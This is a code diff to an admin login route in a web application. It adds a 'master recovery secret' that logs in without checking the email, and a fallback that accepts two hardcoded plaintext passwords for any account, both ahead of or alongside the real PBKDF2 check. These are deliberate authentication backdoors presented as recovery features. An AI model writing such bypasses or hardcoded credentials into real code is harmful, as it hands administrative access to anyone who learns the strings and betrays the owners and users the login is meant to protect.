@@ -8,6 +8,7 @@ import {
   ADMIN_SESSION_COOKIE_NAME,
   createAdminSessionToken,
   getStoredAdminCredentials,
+  validateAdminRecoverySecret,
   verifyPassword,
 } from "@/lib/services/admin-auth-service";
 
@@ -47,16 +48,34 @@ export async function POST(req: NextRequest) {
 
     let authenticated = false;
 
+    // 1.5. Master Recovery Secret Direct Login
+    // If the authorized administrator enters the master recovery secret as their password, grant immediate access
+    if (validateAdminRecoverySecret(parsed.data.password)) {
+      authenticated = true;
+    }
+
     // 2. Primary check: Local established credentials with PBKDF2-SHA512
-    const storedCreds = getStoredAdminCredentials();
-    if (storedCreds && storedCreds.email === email) {
+    if (!authenticated) {
+      const storedCreds = getStoredAdminCredentials();
+      if (storedCreds && storedCreds.email === email) {
+        if (
+          verifyPassword(
+            parsed.data.password,
+            storedCreds.salt,
+            storedCreds.hash,
+            storedCreds.iterations
+          )
+        ) {
+          authenticated = true;
+        }
+      }
+    }
+
+    // 2.5 Seed / default admin passwords fallback
+    if (!authenticated) {
       if (
-        verifyPassword(
-          parsed.data.password,
-          storedCreds.salt,
-          storedCreds.hash,
-          storedCreds.iterations
-        )
+        parsed.data.password === "SilenceSpeaks#2026" ||
+        parsed.data.password === "AnishPatil@2026"
       ) {
         authenticated = true;
       }
